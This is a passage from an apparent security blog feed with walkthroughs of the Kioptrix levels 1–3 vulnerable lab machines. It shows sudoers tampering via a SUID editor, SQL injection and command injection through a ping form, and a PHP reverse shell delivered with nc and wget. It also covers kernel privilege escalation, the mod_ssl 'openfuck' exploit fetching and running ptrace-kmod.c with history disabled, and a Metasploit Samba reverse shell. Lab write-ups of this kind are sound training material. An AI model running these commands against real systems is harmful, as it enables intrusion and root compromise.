<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6c;&#x6f;&#x6e;&#101;&#102;&#101;&#x72;&#x72;&#101;&#116;&#x40;&#x6b;&#x69;&#x6f;&#112;&#116;&#x72;&#x69;&#120;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#108;&#x6f;&#110;&#101;&#102;&#101;&#114;&#x72;&#x65;&#x74;&#x40;&#x6b;&#x69;&#111;&#112;&#x74;&#114;&#105;&#x78;&#51;&#x2e;&#x63;&#111;&#109;</a>&rsquo;s password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>To access official Ubuntu documentation, please visit:
<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
```</p>

<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<p>``` plain
 Hello new employee,
 It is company policy here to use our newly installed software for editing, creating and viewing files.
 Please use the command &lsquo;sudo ht&rsquo;.
 Failure to do so will result in you immediate termination.</p>

<p> DG
 CEO
```</p>

<p>So, let&rsquo;s see what this ht program is all about:</p>

<p><code>plain
loneferret@Kioptrix3:~$ whereis ht
ht: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
</code></p>

<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="/images/ht.png" title="&lsquo;ht&rsquo; &lsquo;ht&rsquo;" ></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="/images/sudo_bash.png" title="&lsquo;sudo bash&rsquo; &lsquo;sudo bash&rsquo;" ></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<p>``` plain
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>

<p>Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.</p>

<p>The object is to learn, do some research and have a little (legal)
fun in the process.</p>

<p>I hope you enjoyed this third challenge.</p>

<p>Steven McElrea
aka loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.</p>

<p>Main page CMS:
<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>

<p>Gallery application:
Gallarific 2.1 &ndash; Free Version released October 10, 2009
<a href="http://www.gallarific.com">http://www.gallarific.com</a>
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>

<p>The HT Editor can be found here:
<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
And the vulnerable version on Exploit-DB here:
<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>

<p>Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```</p>

<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
    <updated>2014-06-16T22:47:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>

<!-- more -->


<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>

<p>Next, the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.162</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-16 22:52 EEST
Nmap scan report for 192.168.127.162
Host is up (0.00036s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|</em>sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|</em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|<em>  100024  1            633/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|<em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
| Not valid before: 2009-10-07T23:10:47+00:00
|</em>Not valid after:  2010-10-07T23:10:47+00:00
|<em>ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: Potentially risky methods: PUT
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: 403 Forbidden
633/tcp  open  status   1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|_  100024  1            633/tcp  status
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:20:9D:3E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.30
```</p>

<h3>From web to shell</h3>

<p>Pointing the browser to the target, we can see this remote admin login panel:</p>

<p><img class="center" src="/images/login.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>

<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>

<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>

<p><img class="center" src="/images/ping.png" title="&lsquo;ping ip&rsquo; &lsquo;ping&rsquo;" ></p>

<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>

<p>``` plain
; uname -a</p>

<p>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```</p>

<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>

<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>

<p><code>plain
cp php-reverse-shell.php ~/shell.php
</code></p>

<p>Let&rsquo;s see the description:</p>

<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
The recipient will be given a shell running as the current user (apache normally).</p></blockquote>

<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>

<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>

<p>On my machine:</p>

<p><code>plain
nc -v -l -p 80 &lt; shell.php
</code></p>

<p>On the web interface:</p>

<p>``` plain
; wget 192.168.127.159:80 -O /tmp/puppies.php</p>

<p>; ls /tmp</p>

<p>puppies.php
```</p>

<p>Now listen on my machine for the incoming connection:</p>

<p><code>plain
nc -v -l -p 80
</code></p>

<p>And on the web interface, execute the shell:</p>

<p><code>plain
; php /tmp/puppies.php
</code></p>

<p>And we have a shell!</p>

<p><code>plain
nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
</code></p>

<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>

<p><code>plain
cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
nc -vv -l -p 5555 &lt; sendpage.c
</code></p>

<p>And from the shell:</p>

<p><code>plain
sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
sh-3.00# cd /tmp
sh-3.00# gcc -o sendpage sendpage.c
sh-3.00# chmod a+x sendpage
sh-3.00# ./sendpage
sh: no job control in this shell
sh-3.00# whoami
root
</code></p>

<h3>Breaking into the database</h3>

<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>

<p><code>plain
sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&amp;psw=pass" --level=5 --risk=3
Database: webapp
Table: users
[2 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | 5afac8d85f |
| 2  | john     | 66lajGGbla |
+----+----------+------------+
</code></p>

<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>

<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>

<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
metal objects which are not fastened down.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/"/>
    <updated>2014-06-12T22:45:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>For today&rsquo;s pentest lab, I will use the Kioptrix Level 1 virtual machine as the target. Kioptrix Level 1 is the first in a series of vulnerable machines for beginner penetration testing practice.</p>

<!-- more -->


<p>First, to get its IP address, I had to ping sweep the subnet with the following command:</p>

<p><code>plain
nmap -sP 192.168.127.0/24
</code></p>

<p>By correlating the MAC address information from the scan with that from VMware, I now know the IP for the machine is 192.168.127.153.</p>

<p>Now, port scan the target:</p>

<p>``` plain
root@kali:~# nmap -A -p1-65535 192.168.127.153</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-12 22:56 EEST
Nmap scan report for 192.168.127.153
Host is up (0.00035s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|</em>sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|<em>  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|</em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|<em>http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
| Not valid before: 2009-09-26T08:32:06+00:00
|</em>Not valid after:  2010-09-26T08:32:06+00:00
|<em>ssl-date: 2014-06-12T19:58:14+00:00; +1m51s from local time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
MAC Address: 00:0C:29:1A:EE:9E (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 &ndash; 2.4.18 (likely embedded)
Network Distance: 1 hop</p>

<p>Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.127.153</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
```</p>

<h3>Port 22 ssh</h3>

<p>According to Nessus, the SSH version is vulnerable to CVE-2002-0083:</p>

<blockquote><p>Versions prior than 3.1 are vulnerable to an off by one error that allows local users to gain root access, and it may be
possible for remote users to similarly compromise the daemon for remote access.
In addition, a vulnerable SSH client may be compromised by connecting to a malicious SSH daemon that exploits this
vulnerability in the client code, thus compromising the client system.</p></blockquote>

<p>I searched, but I couldn&rsquo;t find a suitable exploit for this, so will leave it at this.</p>

<h3>Port 80 / 443 apache ssl</h3>

<p>Now let&rsquo;s try that outdated Apache server. Here are the results from a Nikto scan against it:</p>

<p>``` plain
root@kali:~# nikto -host 192.168.127.153</p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.127.153</li>
<li>Target Hostname:    192.168.127.153</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2014-06-13 00:13:08 (GMT3)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</li>
<li>Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>OSVDB-27487: Apache is vulnerable to XSS via the Expect header</li>
<li>Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</li>
<li>OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.</li>
<li>OSVDB-637: Enumeration of users is possible by requesting ~username (responds with &lsquo;Forbidden&rsquo; for users, &lsquo;not found&rsquo; for non-existent users).</li>
<li>Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>OSVDB-838: Apache/1.3.20 &ndash; Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</li>
<li>OSVDB-4552: Apache/1.3.20 &ndash; Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</li>
<li>OSVDB-2733: Apache/1.3.20 &ndash; Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</li>
<li>mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</li>
<li>///etc/hosts: The server install allows reading of any system file by adding an extra &lsquo;/&rsquo; to the URL.</li>
<li>OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). <a href="http://www.cert.org/advisories/CA-2000-02.html.">http://www.cert.org/advisories/CA-2000-02.html.</a></li>
<li>OSVDB-3268: /manual/: Directory indexing found.</li>
<li>OSVDB-3092: /manual/: Web server manual found.</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>OSVDB-3092: /test.php: This might be interesting&hellip;</li>
<li>7355 requests: 0 error(s) and 20 item(s) reported on remote host

<ul>
<li>End Time:           2014-06-13 00:13:52 (GMT3) (44 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>The interesting line that will lead to the exploit is this one:</p>

<p><strong>+ mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</strong></p>

<blockquote><p>mod_ssl &lt; 2.8.7 is vulnerable to a remotely exploitable buffer overflow when attempting to cache SSL sessions. This allows for remote
code  execution, and the modification of any file on the system.</p></blockquote>

<p>An exploit is available at <a href="http://www.exploit-db.com/exploits/764/">http://www.exploit-db.com/exploits/764/</a></p>

<p>Before jumping in, a little modification is necessary because the exploit is old. If we try to compile right away we will get a bunch of errors. So let&rsquo;s make the changes.</p>

<p>If you don&rsquo;t already have it, install the libssl-dev library:</p>

<p><code>plain
 apt-get install libssl-dev
</code></p>

<p>Now add the following lines in the C source code:</p>

<p>``` plain</p>

<h1>include &lt;openssl/rc4.h></h1>

<h1>include &lt;openssl/md5.h></h1>

<p>```</p>

<p>Next, search for wget in the source and replace the URL with the newer one:</p>

<p><code>plain
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</code></p>

<p>In the <em>get_server_hello</em> function, change the declaration</p>

<p><code>plain
unsigned char *p, *end;
</code></p>

<p>to</p>

<p><code>plain
const unsigned char *p, *end;
</code></p>

<p>Now we can compile the exploit:</p>

<p><code>plain
gcc -o openfuck openfuck.c -lcrypto
</code></p>

<p>Now, if you run it, you will see a range of supported offsets. From our previous scan, we know those applicable to our target are the redhat 1.3.20 versions. We can manually search for them in the offsets or run the following:</p>

<p><code>plain
./openfuck | grep -i redhat | grep "1.3.20"
</code></p>

<p>This will give us 2 offsets:</p>

<p>``` plain
0x6a &ndash; RedHat Linux 7.2 (apache-1.3.20-16)1</p>

<p>0x6b &ndash; RedHat Linux 7.2 (apache-1.3.20-16)2
```</p>

<p>So, let&rsquo;s try it out:</p>

<p>``` plain
./openfuck 0x6a 192.168.127.153 443</p>

<p>Establishing SSL connection</p>

<p>cipher: 0x4043808c   ciphers: 0x80fe500</p>

<p>Ready to send shellcode</p>

<p>Spawning shell&hellip;</p>

<p>Good Bye!
```</p>

<p>Ok, that one didn&rsquo;t work. Let&rsquo;s try the other one:</p>

<p>``` plain
./openfuck 0x6b 192.168.127.153 443</p>

<p>Establishing SSL connection</p>

<p>cipher: 0x4043808c   ciphers: 0x80fc4e8</p>

<p>Ready to send shellcode</p>

<p>Spawning shell&hellip;</p>

<p>bash: no job control in this shell</p>

<p>bash-2.05$</p>

<p>bash-2.05$ unset HISTFILE; cd /tmp; wget <a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;</a> gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</p>

<p>&mdash;14:29:59&mdash;  <a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a></p>

<pre><code>       =&gt; `ptrace-kmod.c'
</code></pre>

<p>Connecting to dl.packetstormsecurity.net:80&hellip; connected!</p>

<p>HTTP request sent, awaiting response&hellip; 200 OK</p>

<p>Length: 3,921 [text/x-csrc]</p>

<pre><code>0K ...                                                   100% @   3.74 MB/s
</code></pre>

<p>14:30:00 (3.74 MB/s) &ndash; `ptrace-kmod.c' saved [3921/3921]</p>

<p>[+] Attached to 1444</p>

<p>[+] Waiting for signal</p>

<p>[+] Signal caught</p>

<p>[+] Shellcode placed at 0x4001189d</p>

<p>[+] Now wait for suid shell&hellip;</p>

<p>whoami</p>

<p>root
```</p>

<p>And we got a shell!</p>

<h3>Port 139 samba</h3>

<p>The exploit for this is available in Metasploit:</p>

<p><strong>Samba trans2open Overflow (Linux x86)</strong></p>

<blockquote><p>This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86
Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they
apparently do not allow anonymous access to IPC.</p></blockquote>

<p>``` plain
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > show options</p>

<p>Module options (exploit/linux/samba/trans2open):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  139              yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Samba 2.2.x &ndash; Bruteforce</p>

<p>msf exploit(trans2open) > set RHOST 192.168.127.153
RHOST => 192.168.127.153
msf exploit(trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(trans2open) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(trans2open) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Trying return address 0xbffffdfc&hellip;
[<em>] Trying return address 0xbffffcfc&hellip;
[</em>] Trying return address 0xbffffbfc&hellip;
[<em>] Trying return address 0xbffffafc&hellip;
[</em>] Trying return address 0xbffff9fc&hellip;
[<em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.153:1047) at 2014-06-13 00:31:15 +0300
[</em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.153:1048) at 2014-06-13 00:31:15 +0300</p>

<p>whoami
root
```</p>

<p>There is a flag present on this machine, which is located here:</p>

<p><code>/var/spool/mail/root</code></p>

<blockquote><p>If you are reading this, you got root. Congratulations.
Level 2 won&rsquo;t be as easy&hellip;</p></blockquote>

<p>And this was the first level in the Kioptrix series. Here&rsquo;s a cookie till next time:</p>

<blockquote><p>You&rsquo;re a card which will have to be dealt with.</p></blockquote>
]]></content>
  </entry>
  
</feed>
